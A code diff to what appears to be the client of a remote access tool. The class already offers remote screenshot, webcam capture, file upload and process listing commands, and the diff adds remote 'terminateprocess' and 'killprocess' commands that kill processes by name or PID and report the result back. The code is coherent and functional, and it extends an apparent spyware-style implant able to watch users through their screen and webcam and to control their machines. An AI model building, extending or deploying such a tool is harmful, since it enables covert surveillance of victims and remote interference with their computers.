@@ -9,7 +9,7 @@ from getpass import getuser
 from datetime import datetime
 from pyscreenshot import grab
 from cv2 import VideoCapture, imencode
-from psutil import process_iter, AccessDenied, ZombieProcess
+from psutil import process_iter, Process, AccessDenied, NoSuchProcess, pids
 from pathlib import Path
 from json import loads as jloads
 from pickle import loads, dumps
@@ -34,6 +34,36 @@ class Client(object):
     # removing the screenshot file
     def removeScreenshot(self):
         Path(self.screenshotPath).unlink(missing_ok=True)
+    
+    # kills some processes by name
+    def terminateProcess(self, processname):
+        processes = [proc for proc in process_iter() if proc.name().lower() == processname.lower()]
+        if processes:
+            try:
+                for process in processes:
+                    process.terminate()
+                
+                self.sendHeader({"content": f"[green]Process [yellow]{processname} [green]has been terminated!"})
+            except AccessDenied:
+                self.sendHeader({"content": f"[red]Error: Can't terminate process [yellow]{processname}, [red]Access denied"})
+        else:
+            self.sendHeader({"content": f"[red]No processes with name [yellow]{processname}."})
+
+    # kills some process by pid
+    def killProcess(self, pid):
+        if int(pid) in pids():
+            name = Process(int(pid)).name() # getting name of process to find others with the same name
+            processes = [proc for proc in process_iter() if proc.name().lower() == name.lower()]
+            if processes:
+                try:
+                    for process in processes:
+                        process.terminate()
+                    
+                    self.sendHeader({"content": f"[green]Process [yellow]{pid} [green]has been terminated!"})
+                except AccessDenied:
+                    self.sendHeader({"content": f"[red]Error: Can't terminate process [yellow]{pid}, [red]Access denied"})
+        else:
+            self.sendHeader({"content": f"[red]No process with PID [yellow]{pid}."})
 
     # getting info of all processes running in the moment
     def getProcessList(self, args):
@@ -174,6 +204,8 @@ class Client(object):
             "/upload": {"action": self.upload},
             "/webcamshot": {"action": self.webcamshot},
             "/getprocesslist": {"action": self.getProcessList},
+            "/terminateprocess": {"action": self.terminateProcess},
+            "/killprocess": {"action": self.killProcess},
             "cd": {"action": self.changeDirectory}
         }
 
